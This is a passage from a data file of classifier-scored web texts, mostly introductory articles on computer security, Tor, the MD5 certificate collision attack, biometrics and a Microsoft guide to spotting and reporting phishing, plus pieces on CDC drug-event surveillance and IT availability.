in use in almost every major organization. And most studies have shown that PKI can be employed to handle most security and verification operations, but according to the authors, other requirements such as availability, performance, uncoercibility, untraceability and anonymity cannot be fulfilled without additional measures. PKI on its own will not provide maximum security for authentication unless it is incorporated with other security technologies such as smart cards and biometrics.<",
        "prob": "tensor([[2.0323e-06, 1.0000e+00]])"
    },
    {
        "text": "Network and Computer Security Tutorial Version 0.4.0 April 16, 2001 This computer security tutorial is written based on my experiences with computer and network security along with my training and information I have read. The field of security is constantly changing so I cannot guarantee that information in this computer security tutorial will be current. This computer security tutorial will define some basic security issues and give insight into what causes security to be a constant issue. This computer security tutorial will help you decide what to protect and provide some basic information about attacks that may be made against your network, computer systems, or data. It will also provide computer and network security recommendations for you or your organization. Although much useful information can be derived from this document without the reader having networking knowledge, to use this document in depth, I recommend that readers of this computer security tutorial have a fundamental knowledge about networking. The information contained in The CTDP Networking Guide contains the networking documentation required to understand this computer security tutorial. In this computer security tutorial, the terms computer security and network security will be used often. When the term computer security is used, it specifically refers to the security of one computer, although the overall security of each individual computer is required for network security. When the term network security is used, it refers to the security of the network in general. This includes such issues as password security, network sniffing, intrusion detection, firewalls, network structure and so forth. Security Violation Definition Computer or network security has been violated when unauthorized access by any party occurs. Computer security is required because most organizations can be damaged by hostile software or intruders. There may be several forms of damage which are obviously interrelated. These include: The methods used to accomplish these unscrupulous objectives are many and varied depending on the circumstances. This guide will help administrators understand some of these methods and explain some countermeasures. Computer security can be very complex and may be very confusing to many people. It can even be a controversial subject. Network administrators like to believe that their network is secure and those who break into networks may like to believe that they can break into any network. I believe that overconfidence plays an important role in allowing networks to be intruded upon. There are many fallacies that network administrators may fall victim to. These fallacies may allow administrators to wrongfully believe that their network is more secure than it really is. This guide will attempt to clarify many issues related to security by doing the following: There are many different aspects to computer and network security as you will read in this document. These different areas of computer security are interdependent on each other in order for a network to be secure. If one or more areas of computer security are ignored, then the entire security integrity of the organization's network may be compromised. A clear example of this is in the area of computer virus or worm protection. Computer virus protection programs can only filter known viruses or worms. There are viruses or worms that are not yet recognized as virus programs immediately after their release. The best way to make unrecognized virus or worm programs less effective is by quickly removing the vulneribilities that they use. Some of these vulnerabilities are operating system and application program errors. When security patches are created for software, they should be quickly applied. In this way the vulnerabilty to viruses is minimized but not eliminated. There are other steps which may further reduce this vulnerability, but it can never be completely eliminated. If you are reading this document and are thinking that you can get all the information required to make your network completely secure, then you are sadly mistaken. In many ways, computer security is almost a statistical game. You can reduce but not eliminate the chance that you may be penetrated by an intruder or virus. This is mainly for one reason. No one can ever know all the software vulnerabilities of all software used on a system. This is why even those who consider themselves hackers will say that the number one computer security threat is the lack of quality in the applications and operating systems. At this point, I could talk about the various corporate entities that write software and why software lacks the quality that many of us believe that it should possess, but that subject is not only way beyond the scope of this document, but also way beyond the scope of this project. The bottom line here is that unless you can remove all the application and operating system problems that allow viruses and intruders to penetrate networks, you can never secure your network. Additionally the users on your network are potentially a greater security risk than any programs. Obviously removing all vulnerabilities is impossible and will not secure your network against user errors. I have even considered the possibility that an operating system without a network interface can be completely secure, but even this cannot be guaranteed. Unknown viruses or trojan programs can creep in with applications on CDs or floppies. This has been known to happen. Although an attacker may not be able to get data from the system, they can damage or destroy data. The fact that complete security is impossible is the reason security experts recommend \"layered security\". The idea is to have multiple ways of preventing an intrusion to decrease the chance that intrusions will be successful. For example, you should have virus protection on your client computers. To help layer this security you should also filter viruses at your email server. To help even more, you should block the most dangerous types of email attachments to prevent unrecognized viruses and other hostile software from entering your network. Another good defense layer would also include educating your users about viruses, how they spread, and how to avoid them. There are many documents that attempt to define the term hacker. I believe that the term hacker is a connotative term. This means that it is more defined by people's beliefs rather than by a dictionary. Some believe that a hacker is a very skilled computer person. Others believe that hackers are those that perform unauthorized break ins to computer systems. The media and many sources have caused many uninformed people to believe that a hacker is a threat to computer and network security while this is not the case. A hacker is no more likely to break the law than anyone else. I use the more accurate descriptive term, \"intruder\" to describe those who intrude into networks or systems without authorization. This guide will not talk about physical computer security beyond this paragraph. Your organization should be aware how physically secure every aspect of its network is because if an intruder gets physical access, they can get your data. Be sure the your organization properly secures locations and consider the following: This paragaph describes some commonly used computer security terms.",
        "prob": "tensor([[0.0014, 0.9986]])"
    },
    {
        "text": "Boonsri DickinsonAssociate Editor of BYTE Mobile Device Biometrics: The Eyes Have It Category: Smartphones, Social Networking With so much of our banking and interactions taking place on our mobile phones, we still live with a false sense of security because it doesn't take much for someone to hack our phones. By using more unique identifiers biometrics such as eyes, rather than passwords corporations and banks may have a more secure way to authenticate our identity. EyeVerify makes biometric technology which uses eye vein patterns. CEO Toby Rush says \"no one can pretend to be you with an eye print. Most eye verification technologies lack 'liveness' detection. With EyeVerify, you can't fake it with photos or videos. You have to stand in front of your camera on any smartphone.\" EyeVerify implements a vein biometrics system that only requires software and the device's camera. It allows mobile users to authorize transactions and access secure information. Using the camera on the phone, the software can determine 4 ROIs (regions of interest) in your eye, sending a pass/fail and a confidence interval. If it passes, you are granted access to the application. If it fails, access is denied. The technology came out of academic labs in 2005, after Dr. Reza Derakhshani, University of Missouri-Kansas City (UMKC), and Dr. Arun Ross, West Virginia University (WVU) had developed the technology to identify people by their eyes. Rush saw an opportunity to commercialize it and decided to license the researchers' patent that uses the blood vessels in the back of the eye. As Rush sees it, it's a way for companies to build services that allow their phones to be secure without adding any hardware requirements. Even in a BYOD scenario people can use personal phones and have biometric access to access corporate documents, Rush said. He also sees applications in healthcare, where doctors and nurses or patients can access their records. Or in online education, it can let teachers know who is taking the test. Even in logging into social networks such as Facebook, it can authenticate who is online. With EyeVerify, banking applications and others can use the 'liveness' factor for authentication. By using the camera, the software can detect if there's a person there depending on the focus and exposure and white balance. Banking in particular could benefit from a more secure system. Most people don't like to use mobile banking because they have security concerns, Rush said, and EyeVerify can give them the confidence they need. As we live our lives more online, protecting our digital identify becomes that much more important. Rush said that in emerging markets such as Nigeria and Indonesia, identity is the biggest issue in combating fraud. Biometrics are not expensive, but have had false starts in the past. For instance, biometric technology that used the retina as verification never really took off. Airports are using the iris and the color of the eye, but that requires an expensive hardware component. \"We are looking at the whites of the eye. For corporate applications for authentication, the user would hold the camera away from the face, look left or right and EyeVerify would process it in a few seconds. The software would respond to calling application and either confirm or deny who you say you are. The entire process takes about 4 seconds. Security researcher Dan Kaminsky said, \"Biometrics have long been seen as a possible solution to the authentication crisis, as we're all enrolled merely by virtue of having bodies. The field has struggled, however, due to problems of deployment (you have to have readers everywhere), accuracy (it's surprising how little uniqueness there is in voices and faces), and security (you leak your biometrics everywhere you go). EyeVerify is interesting in that they're leveraging the ubiquity of cell phones with high resolution cameras to solve the problem of deploying readers, and that they're using one of the few biometrics that is in fact highly unique, and thus effectively discriminates between many users. That being said, like all biometrics, you expose your eyes frequently and in public.\" Another eye verification company called Iris Guard allows customers to conduct banking or buy and pay with their eye, claiming to eliminate identity theft and fraud. Iris Guard uses an iris biometric camera, rather than the whites of the eyes. Even 24 Hour Fitness is using fingerprints to identify people to cut down fraud and to save money on printing plastic cards. While there's no such thing as absolute security, using more unique ways of identifying that you are who you say you are will get us that much closer to fail-safe security. And with the popularity of mobile phones and good cameras in them, EyeVerify may be a step in the right direction. In general, people don't like having to go through inconvenience to lock down their phones, so they will have to make sure the process of verifying your eye is quick and easy to use. EyeVerify says that their iPhone version is done, and is in beta. The Android application will be completed this month. Kaminsky casts some doubt on Rush's claim that eye prints can't be faked: \"Their pattern can be captured surreptitiously, and replayed forever with no possibility of revocation. But if the only people who have to worry about hacking you are those who can get within a very short distance away -- realistically, that's something of a win. Liveness checking never really works. But it doesn't matter -- if their accuracy is reasonable, they're useful. (It can't work because the pattern is static and effectively 2D. But seriously, they just need to try.) Interestingly, they're slightly worse off than fingerprints, as high resolution photos of your fingers are rarely published while eyes may very well be.\" Boonsri Dickinson is the Associate Editor of BYTE",
        "prob": "tensor([[2.1028e-06, 1.0000e+00]])"
    },
    {
        "text": "Computer Hacking and Security With the rapid growth of the worldwide Internet user base, online transactions are believed to reach well over a trillion dollars in the next three years. With stakes this high, it makes sense for all parties involved to secure the Internet. Haphazard handling of financial and personal information can lead to the Internet being constantly associated with fraud and privacy abuses instead of being a viable commerce medium. The goal for higher security starts with the individual user. The term \"hacker\" has been around for a while. It originally referred to a person not well versed with a computer trying different things to accomplish a task. To hack was to figure out something through sheer trial and error or logical deduction. Today, a hacker described as a person who breaks into computers for various reasons. Crackers and script-kiddies are two other more commonly used terms describing those involved in the break in or disruption of an online service. Security problems can occur in any networked environment. Many of the problems are related to the exploitation of the original design of the TCP/IP suite of internetworking protocols, but the majority are due to configuration or operator errors. Hackers are not just looking for websites or government computers to hack - utility grids, emergency information systems, controls for dams and locks, financial information, inter-banking information, military communications and much more sensitive information travels on the Internet and other communication networks. In broad terms, security threats can be classified as active and passive. ACTIVE HACKING:Active attacks involve the modification of transmitted data and attempts to gain unauthorized access to systems. Data communication is based on a set of handshakes to ensure the smooth and reliable flow of information. A hacker that is between a client and a server and is able to spoof (illegally duplicate) the IP address and sequence numbers, can attack either machine in several ways. The hacker can disable one of the machines and take the identity of the other, or the hacker can mimic either machine and carry on conversations impersonating the other. A hacker could also attach additional information to a client request and strip the corresponding additional response from the packet before forwarding the remaining response to the client's original request. All this while having access to information that is assumed to be going back and forth between two 'trusted' systems. Computer viruses and trojans are also examples of active attacks. They can disable machines or in the case of trojans allow malicious hackers access to senstive information by creating a back door. PASSIVE HACKING:Passive attacks have to do with evesdropping and monitoring transmissions. All electronic transmissions (email, WWW, telenet, etc) can theoretically be monitored. Since most computers (and the whole Internet) is part of network(s), spying on data transmissions is a major concern. One of the earliest and most sophisticated passive evesdropping example comes to us from the Cold War. The US Navy was able to 'tap' into Soviet undersea fiber optic lines by using special submaries and for years had complete knowledge of that set of communications. On the Internet, protocols like HTTP, FTP and telnet are non-encrypted modes of communications that can easily be compromised. Therefore, encrypted versions (HTTPS, SSH, etc) should be used when transmitting sensitve information. Refer to the resources section for other interesting links and sources, consider a personal firewall router and check these personal firewall reviews.",
        "prob": "tensor([[2.0619e-06, 1.0000e+00]])"
    },
    {
        "text": "Centers for Disease Control and Prevention’s Active Surveillance Systems for Clinical Care The CDC’s adverse event surveillance systems include the National Healthcare Safety Network (the successor to the National Nosocomial Infections Surveillance System, the Dialysis Surveillance Network, and the National Surveillance System for Health Care Workers) (Tokars et al., 2004) and the National Electronic Injury Surveillance System-Cooperative Adverse Drug Event Surveillance project (NEISS-CADES). Through NEISS-CADES, the CDC conducts nationally representative surveillance for adverse drug events (ADEs) treated in hospital emergency departments. The program is aimed at controlling or preventing injury by identifying and describing the public health burden of outpatient ADEs, generating hypotheses about risk factors for these events, and helping to design interventions for reducing medication errors in the outpatient setting. Estimates for 2004 indicate that approximately 700,000 patients were treated in emergency rooms for an ADE, and approximately 100,000 were admitted or transferred to another facility (Budnitz, 2005). Early data indicate that unintentional overdoses were the most common cause of ADEs (39 percent), and that two drugs (i.e., warfarin and insulin) were associated with 16 percent of all ADEs and 33 percent of ADEs in patients over age 50 (Budnitz et al., 2005). NEISS-CADES has several important limitations. First, the system is limited to ADEs occurring outside the hospital and to those that result in emergency room visits. Second, the system may fail to capture some serious outpatient ADEs (those treated in a care setting other than an emergency department) and may include nonserious events (as patients may use emergency departments for primary health care) (Walls et al., 2002). Third, the system is designed for national surveillance and not for quality improvement by individual hospitals. Nonetheless, given the importance of monitoring the national health burden of ADEs as one aspect of medication safety and quality improvement, the continued operation and enhancement of NEISS-CADES could play an important role in monitoring the nation’s progress toward reducing medication-related harm in the outpatient setting. The system’s usefulness would be enhanced by identifying appropriate measures of drug exposure, ensuring continued data quality, and developing mechanisms for timely data dissemination.",
        "prob": "tensor([[0.2240, 0.7760]])"
    },
    {
        "text": "Disaster recovery blurs into high availability (or other way round?) It's a virtualisation thing Workshop IT managers use two terms when talking about systems availability. These are: High Availability or “HA”, for keeping systems running without any form of unplanned down time; and Disaster Recovery or “DR”, for ensuring that systems are rapidly returned to operation if they fail. Some confusion has developed between these terms over the years. Today, many vendors use HA and DR almost interchangeably. This is especially evident when they talk of applying the expanding range of virtualisation solutions to improve systems availability. It is almost the case today that the terms have become blurred to such a degree that it is worth asking the question, is there any difference between the two? Following on from early consolidation of servers using virtualisation, organisations are beginning consider what advantages there might be in actively managing virtualised systems. In addition, there is some interest in creating “private cloud solutions”. This attention, coupled with the hype surrounding external hosted and outsourced services, may help shape thoughts on these capabilities. Another factor coming into play is the question of how virtualisation might help organisations to extend the systems to which they provide HA / DR capabilities. Until very recent times, the high cost and complexity of providing either HA or rapid DR capabilities has meant that only the most important of business services and applications operated in these fashions. But now organisations must work out how to assess the cost of availability/continuity for an expanding range of applications, potentially by creating a business service catalogue that prioritises and costs such characteristics in service level agreements. Before considering if there are any real differences between systems offering HA or DR capabilities today, let us look at the causes of application delivery. The figure below is illuminating in many ways, showing that human generated failures are very well represented as the primary cause of service interruption. Effective use of change management processes and tools, coupled with higher levels of “automation”, can help reduce the instances of human error considerably. Genuine system problems, such as network failure, physical component failure or power outages, are much less likely to be at the heart of an interruption to service availability. The days when hardware failure was the usual problem to be fixed are behind us as reliability, availability and serviceability features have migrated into commodity servers. We can look deeper into the question of whether HA and DR mean different things today than they did even in the recent past. Until recently, the term HA was applied only to systems that needed to function with strict limits on any interruption to service delivery, at least as perceived by the end users or customers of the service. DR, on the other hand, was the phrase applied to the process of getting a service up and running again with users back working, following any form of systems / network failure or any other form of service interruption. In extreme circumstances, DR was also commonly applied to describe how to respond to the complete loss of a service or an entire system, or potentially recuperating from the loss of a building, computer room or data centre. Today, it is clear that the accepted usage and understanding of these terms has changed significantly. This is most notable when considering the language commonly used around virtual servers. It is quite common to see the two terms used almost interchangeably with little differentiation. Some vendors are prone to describe the now relatively well established ability to spin up a new virtual machine rapidly following a service degradation or interruption as HA. Assume the recovery position This usage is not particularly accurate, as it amounts to just fast, and potentially quite simple to enact, recovery from failure, better known as DR. In fairness it should be mentioned that whilst some vendors use HA in this way, others prefer to describe such scenarios as a natural extension of DR. As mentioned above, a major use of the term DR has been to describe what happens when something big happens to a system that threatens the ability to run a range of services in that location. Expanding DR to include the recovery capabilities of single virtual machines or VMs running on a physical system is not a big stretch in usage. It is now possible to implement genuine HA with virtual systems, but this needs additional software management tools. It remains to be seen if the distinction between the two terms will remain meaningful in the coming years, as virtualised systems and associated management tools become ever more widely deployed. In some ways, the distinction between HA and DR may even prove to be helpful to IT managers, as the chart above highlights just how difficult it has been in the recent past to obtain approval to secure funding to protect systems against failure. In many ways, the reluctance to provide funding for HA mirrors the problem in getting approval to implement better systems management tools generally. It is to be hoped that, as genuine HA systems become more affordable, organisations recognise the value of good management tools to help ensure higher levels of service delivery and the undoubted business benefits delivered by IT as a result. Some confusion has developed between these terms over the years. True, and this article isn't helping. Traditionally High Availability (HA) has meant the same as it does today, ensuring that a localised fault such as a server or network outage, or a disk crash, is automatically handled in such a way that a service remains available, or is restored very rapidly. Disaster Recovery (DR), as the name implies, is a solution to a more widespread outage, perhaps a fire or a flood, which takes a whole datacentre off-air. It may not be automated, and recovery times are often somewhat longer, especially when it is integrated as part of a general Business Continuity plan which covers more than just the IT aspects of a disaster. I would say that there is much more confusion between the terms Fault Tolerant (FT) and Highly Available (HA), which may be what this article is really considering. What about FT and BC? There's also fault tolerance (FT) which is a very high level of redundancy, such that software is unaware of any failure. I'm thinking especially of Tandem. And then there's business continuity (BC) which is like DR but focuses less on the disastrous aspects. I'm thinking near line storage or data replication. The lines can blur but you really need prudent amounts of both. You don't want to fail over to the bunker just because one disk goes bad. And your RAID6 array doesn't help when it's under water. Well, I quite liked the article, don't care so much about whether it's HA or DR as long as it's UP... Having been partially DOWN myself recently, I think this is a very important topic.... I especially like the idea of a \"business service catalogue\" which details costs/benefits of HA solutions, for a particular input. I also like the idea of a root cause log, not mentioned in the article but implied by the very nice bar chart. I plan on implementing both as database tables in my BIS. HA & DR? From my perspective, it's online (local memory ... fast ... a workstation), nearline (available over the network, without human intervention ... sometimes slowish ... \"the web\") & offline (tape that isn't physically available to the Memorex robot and needs human intervention ... \"the cloud\") ... but then I come from a real hardware background. In other news ... March of 2008? Is freeformdynamics getting further & further behind? Perhaps they should get their heads out of the Clouds and invest in online storage ...",
        "prob": "tensor([[1.6433e-05, 9.9998e-01]])"
    },
    {
        "text": "Posted by Chenxi Wang on February 10, 2009 In December 2008, a group of researchers demonstrated a credible attack against MD5 signatures. Since then, Forrester received a number of client inquiries regarding the security strength of their MD5 certificates. There seems to be much confusion over what the attack is about and its actual consequences. To properly understand the security consequence of this attack and the impact on certificates, we need to understand how the attack works. The researchers demonstrated a successful attack against the RapidSSL certificate authority, which uses MD5 signatures to sign certificate requests. This is how the attack worked: the researchers first got the RapidSSL CA to sign a particular certificate request, issued for a domain in their control. This request and the ensuing signature are completely legitimate. The researchers then demonstrated that they were able to create a second certificate bearing the same signature, for a separate made-up entity. In essence, they were able to find two certificates with the same valid signature. In cryptographic parlance, this is a hash “collision” attack. How bad is this attack? It’s important to understand that the researchers were able to create a collision attack for a “particular” original signature, namely a signature that is under the attacker’s control. Not for “any” original signatures. If you have a MD5 valid RapidSSL certificate, the chances are good that no one will be able to create a fake certificate that has the same signature as yours. However, this attack put forth an increased risk of encountering fake MD5 certificates on the Internet. VeriSign, the owner of RapidSSL CA, has stopped using MD5 signatures altogether by the end of January 2009. VeriSign is moving to SHA-1 signatures, which is the current standard. Although SHA-1 has also been found to be vulnerable to collision attacks*, finding a collision with SHA-1 requires much more computational power and therefore it is safe to assume that SHA-1 is more secure than MD5. Again, if you currently have a valid MD5 certificate, there is no need to panic and no need to upgrade right now. You can simply let your certificate expire at the end of its lifetime and then move to a SHA-1 certificate. What is the long term consequence? It’s likely that even SHA-1 will be broken by ordinary means some day, as computational resources become cheaper every day. We at Forrester will do our best to bring you the latest in terms of new attacks and threats. But as an organization that conducts secure business online, you should remain aware of advances in cryptographic technologies and new crytoanalysis methods. *Two papers detailed the attack on SHA-1 algorithm were presented at Crypto 2005 rump session: \"Efficient Collision Search Attacks on SHA-0\" and \"Finding Collisions in the Full SHA-1Collision Search Attacks on SHA1” by XiaoYun Wang.",
        "prob": "tensor([[2.0006e-06, 1.0000e+00]])"
    },
    {
        "text": "Last week we promised a look at Tor, a system for anonymous Internet communication, primarily developed by Nick Mathewson and Roger Dingledine. Current development is supported by the Electronic Frontier Foundation (EFF), but Tor was originally developed as part of the U.S. Naval Research Laboratory's Onion Routing program. As the Tor web page explains, Tor is a \"toolset for a wide range of organizations and people that want to improve their safety and security on the Internet.\" What does that mean? In a nutshell, Tor is a client/server application that anonymizes traffic by routing it from the client through a series of nodes to hide the origin of a request. It can also be used to protect services against denial of service attacks and the like by hiding Tor routes traffic through nodes that \"know\" about the previous node and the next node -- but not the rest of the network. By routing traffic through a series of \"onion routers\" Tor makes it difficult for the receiver, observers and even other Tor routers to detect the source of traffic. A more complete description of Tor's design can be found in the design paper; a protocol specification is also available for those who wish to build compatible Tor works as both a server and as a client. By default, Tor runs as a client only, but it can be configured to allow other users to connect to your system as a Tor node. In addition, Tor can be used to run \"hidden\" services that do not reveal your IP address to others at all. The \"hidden wiki\" maintains a list of hidden services that users can see as an example. Finally, it's possible to set up one's own Tor network that does not interact with the public Tor network, for those who want to test the protocol but may lack access to the Internet. To achieve best results, one may need to use Tor in conjunction with other applications. For example, users who wish to browse anonymously would use Tor in conjunction with Privoxy. Other applications may require use of tsocks or ProxyChains. To see what Tor had to offer, we installed it on a Ubuntu Hoary machine, along with Privoxy, tsocks and ProxyChains. Configuring services to work with Tor is not terribly difficult, and there is a relatively detailed HOWTO for users who wish to configure specific applications like Gaim, X-Chat, SSH or BitTorrent with Tor. It should be noted that using Tor can have an impact on performance for client applications. Using Tor and Privoxy together for browsing, for example, introduced a notable lag. Firefox users may be interested in using the SwitchProxy Tool extension to switch Proxy use on and off, reserving Tor for specific sites rather than for all web browsing. Users should also be prepared for some odd behavior on some sites -- for example, we kept being redirected to country-specific versions of Google, rather than Google's main site, when using Tor and Privoxy. Tor itself didn't seem to have much of an impact on system performance overall. Tor is not completely foolproof. It could be possible for someone who's running a Tor server to modify Tor or use other software to monitor traffic going through the server. Traffic coming out of the \"exit node\" (the last hop in the Tor \"circuit\") is not encrypted, so a malicious user could set up a Tor server and browse traffic coming out of their machine. (It is possible to specify your exit node in the Tor configuration.) There are traffic that passes through Tor. Interested users should also have a look at the EFF's legal issues page about Tor. Though Tor can be used for things like BitTorrent, it is not designed to assist copyright infringement or other illegal activity. There is still a lot of development ahead for Tor, but it is definitely worth a look for users who are interested in anonymous communication on the Internet. Users with bandwidth to spare are also encouraged to set up and run a Tor server to help test its scalability and to help provide a larger Tor network. See the download page for Tor packages and source code. to post comments)",
        "prob": "tensor([[2.8544e-05, 9.9997e-01]])"
    },
    {
        "text": "|Microsoft Office Outlook® 2003 Microsoft Outlook® 2000 and 2002 Con artists have been around since time began, and now that we are in the Internet Age they are on the Web preying on unsuspecting online consumers. Online fraud is on the rise, and the techniques for creating deceptive e-mail messages and Web sites are getting more sophisticated. Learn more about what you can do to help protect yourself from online fraud. What is online fraud or phishing? Phishing (pronounced “Fishing”) is an online fraud technique used by criminals to entice you to disclose your personal information. Phishing is the fastest rising online crime method used for stealing personal finances and perpetrating identity theft. Phishers use many different tactics to lure you, including e-mail and Web sites that mimic well-known, trusted brands. A common phishing practice involves \"spamming\" recipients with fake messages that resemble a valid message from a well-known Web site or a company that the recipients might trust, such as a credit card company, bank, charity, or e-commerce online shopping site. The purpose of fake messages is to trick consumers into providing the following personal information: Criminals use this information in many ways for financial gain. For example, a common practice is identity theft, whereby the criminal steals your personal information, takes on your identity, and can then do the following: - Apply for and get credit in your name. - Empty your bank account and max out your credit cards. - Transfer money from your investment or credit line accounts into your checking account, and then use a copy of your debit card to withdraw cash from your checking account at ATMs around the world. For tips on how to avoid being the victim of online fraud, see the Best practices to help protect yourself from online fraud section later in this article. Examples of phishing schemes Some examples of phishing schemes include: - Fake e-mail messages from what appears to be from a company you do business with warning you that they need to verify your account information or your account will be suspended. - A combination of auction fraud and fake escrow sites. This occurs when items are put up for sale at a legitimate online auction to lure you into making payments to a fake escrow site. - Fake online sales transactions, whereby a criminal offers to buy something from you and requests that they pay you an amount well over the price of the item they are buying. In return, they ask you to send them a check for the difference. The payment to you is not sent, but your check is cashed, and the criminal pockets the difference. Additionally, the check that you send has your bank account number, bank routing code, address, and phone number. - Fake charities asking you for money. Unfortunately, many criminals take advantage of your goodwill. There are many more phishing schemes out there. For an up-to-date report on phishing schemes that authorities have uncovered, visit the Anti-Phishing Working Group Web site. How can I tell if an e-mail message is a fraud? Unfortunately, as phishing attacks become more sophisticated, it is very difficult for the average person to tell if a message is fraudulent. That is why phishing schemes are so prevelant and successful for criminals. For example, many phony e-mail messages link to real company logos of well-known brands. However, their are things you can be on the lookout for: - Requests for personal information in an e-mail message Most legitimate businesses have a policy that they do not ask you for your personal information through e-mail. Be very suspicious of a message that asks for personal information even if it might look legitimate. - Urgent wording Wording in phishing e-mail messages is usually polite and accommodating in tone. It almost always tries to get you to respond to the message or to click the link that is included. To increase the number of responses, criminals attempt to create a sense of urgency so that people immediately respond without thinking. Usually, fake e-mail messages are NOT personalized, while valid messages from your bank or e-commerce company generally are. The following is an example from a real phishing scheme: Dear valued bank member, it has come to our attention that your account information needs to be updated due to inactive member, frauds, and spoof reports. Failure to update your records will result in account deletion. Please follow the link below to confirm you data. - Be aware of URLs that include the @ sign. In the following example, the URL would take you to the location that comes after the @ sign, not to Wood Grove Bank. This is because browers ignore anything in the URL that comes before the @ sign: The real location, nl.tv/secure_verification.aspx, could easily be an unsafe site. - Another common technique that has been used is a URL that at first glance is the name of a well-known company but on closer scrutiny is slightly altered. For example, www.microsoft.com could appear instead as: Microsoft has recently won several lawsuits against individuals who have used these types of URLs to spoof legitimate Microsoft properties. However, the practice remains pervasive and is often protected by national boundaries. Other kinds of images placed in e-mail messages can be linked to a spammer's server and act like Web beacons (web beacon: An embedded object in a webpage or email message usually connected to a graphic that might be invisible to the user. It can be used to verify that your email address is valid because when you view the message, images with the web beacon are downloaded from a tracking web server.). When you open the e-mail message the images are downloaded and information is passed back to the server. This information is used to verify that your e-mail address is valid and so you might be spammed again. Outlook by default automatically blocks these kinds of external images. For more information see About protecting your privacy by blocking automatic picture downloads. How can I tell if a Web site is a fraud? Similar to fraudulent e-mail messages, faked Web sites contain convincing logo graphics and Web links. This makes it hard to tell if they are fraudulent. The best strategy is to not click on links in suspicious messages. Some things to look for that legitimate Web sites should have are as follows: Important Note that https:// is sometimes faked in links, such as in the \"masked link\" example shown in the Fake Links section. - A digital certificate for the Web site An additional benefit of SSL is authentication (authentication: In a multiuser or network environment, the process of validating user logon information. A name and password are compared to an authorized list, and, if there is a match, access is granted with the level of permission specified.) – the process of identifying a Web site to you. SSL provides this benefit by using a digital certificate, which the site presents to your browser when you connect. To view the certificate, double-click the lock icon in the lower-right corner of the browser and examine the Issued to field. The name shown on the certificate should match the site that you think you're on. For example, if the site really is Wood Grove Bank, then the Issued to name should match the URL woodgrovebank.com. If the name is different, you might be on a faked site. Again, be very careful of slight misspellings. If the certificate is expired, not trusted by the certificate authority, or has a name that doesn't match the name displayed in the Address bar, Microsoft Internet Explorer displays a warning message. To learn more about the certificate, click the Details tab. If you're not sure whether a certificate is legitimate, don't enter any personal information. Play it safe and leave the Web site. To find out more ways to determine if a site is secure, read How Internet Explorer helps keep your data safe. Best practices to help protect yourself from online fraud - Never reply to e-mail messages that request your personal information Be very suspicious of any e-mail message from a business or person that asks for your personal information — or one that sends you personal information and asks you to update or confirm it. Instead, use the phone number from one of your statements to call; do not call a number listed on the e-mail message. Similarly, never volunteer any personal information to someone who places an unsolicited call to you. - Don't click links in suspicious e-mail Don't click a link contained in a suspicious message. The link might not be trustworthy. Instead, visit Web sites by typing their URL into your browser or by using your Favorites link. Do not copy and paste links from messages into your browser. - Use strong passwords and change them often If your account allows them, strong passwords combine uppercase and lowercase letters, numbers, and symbols, which make them difficult for other people to guess. Don't use real words. Use a different password for each of your accounts and change them frequently. It's hard to remember all those passwords. For tips on creating strong passwords and how to remember and store passwords securely, see Creating stronger passwords. - Don't send personal information in regular e-mail messages Regular e-mail messages are not encrypted and are like sending a post card. If you must use e-mail messages for personal transactions, use Outlook to digitally sign and encrypt messages by using S/MIME (S/MIME: Secure Multipurpose Internet Mail Extensions (S/MIME) is a specification for secure email messages that uses the X.509 format for digital certificates and uses various encryption algorithms such as 3DES.) security. Outlook Express, Microsoft Office Outlook Web Access, Lotus Notes, Netscape, and Eudora all support S/MIME security. - Do business only with companies you know and trust Use well-known, established companies with a reputation for quality service. A business Web site should always have a privacy statement that specifically states that the business won't pass your name and information to other people. - Make sure the Web site uses encryption The Web address should be preceded by https:// instead of the usual http:// in the browser's Address bar. Also, double-click the lock icon on your browser's status bar to display the digital certificate for the site. The name that follows Issued to in the certificate should match the site that you think you're on. If you suspect that a Web site is not what it should be, leave the site immediately and report it. Don't follow any of the instructions it presents. - Help protect your PC It is important to use a firewall, keep your computer updated, and use antivirus software, especially if you connect to the Internet through a cable modem or a digital subscriber line (DSL) modem. For information on how to do this, visit Protect your PC. For additional information on virus protection, see Best practices for protection from viruses, and Best practices to help prevent spam. You should also consider using anti-spyware software. You can download Microsoft anti-spyware or use a third-party product available from the security software downloads and trials site. - Monitor your transactions Review your order confirmations and credit card and bank statements as soon as you receive them to make sure that you're being charged only for transactions you made. Immediately report any irregularities in your accounts by dialing the number shown on your account statement. Using just one credit card for online purchases makes it easier to track your transactions. - Use credit cards for transactions on the Internet In most locales, your personal liability in case someone compromises your credit card is significantly limited. By contrast, if you use direct debit from your bank account or a debit card, your personal liability frequently is the full balance of your bank account. In addition, a credit card with a small credit limit is preferable for use on the Internet because it limits the amount of money that a thief can steal in case the card is compromised. Better yet, several major credit card issuers are now offering customers the option of shopping online with virtual, single-use credit card numbers, which expire within one or two months. For more details, ask your bank about perishable virtual credit card numbers. How do I report online fraud and identity theft? If you believe that you have received fraudulent e-mail messages or have been the victim of online fraud, you can report the problem to the following groups: - FBI The FBI: Internet Fraud Complaint Center (IFCC) works worldwide with law enforcement and industry to promptly shut down phishing sites and identify the perpetrators behind the fraud. - FTC If you believe that your personal information has been compromised or stolen, you should report the circumstances to the FTC: National Resource for Identity Theft and visit their site to learn how you can minimize the damage. - Attach and send fake e-mail messages to authorities Reporting fake messages to authorities helps in the effort to combat phishing schemes. There’s information buried in the header of an e-mail message that technical experts require in order to flush out fraud or abuse; without it they may be unable to pursue an investigation. Follow the steps below to send the full, original header of the message you want to report. Some e-mail addresses you can use to report suspicious mail are: firstname.lastname@example.org goes to the Anti-Phishing Working Group, an industry association. email@example.com goes to the FTC. firstname.lastname@example.org goes to MSN. email@example.com goes to Microsoft. In these steps, you copy the headers from the problem message into a new message. You also attach the problem message to the new message. - In Outlook, right-click the suspicious message you want to report, and then click Options on the shortcut menu. - To copy the full headers, right-click inside the Internet headers box, and then click Select All on the shortcut menu. - To copy the full header, press CTRL+C, and then click Close. - Open a new message, and type the e-mail address of the company to whom you are reporting the problem message — for example, firstname.lastname@example.org. - If Microsoft Word is your e-mail editor, click the down arrow next to Insert File , and then click Item. If Microsoft Word is not your e-mail editor, on the Insert menu, click Item. - Click the message you want to report, and then click OK. This attaches the problem message to the new message. - In the Subject line, type I am reporting suspicious email, or whatever you think is best to describe what you are doing. - In the body of the new message, to paste the header you copied in step 3, press CTRL+V. - Click Send. Tips on safer online shopping and banking If you want more information from Microsoft on ways to help safeguard your personal information while shopping or banking online, visit the Online Fraud Web site. Keep in mind that not all identity thieves are high-tech hackers. Some use low-tech methods, such as dumpster diving, to swipe personal information. Buy a shredder and destroy bills, pre-approved credit offers, and other 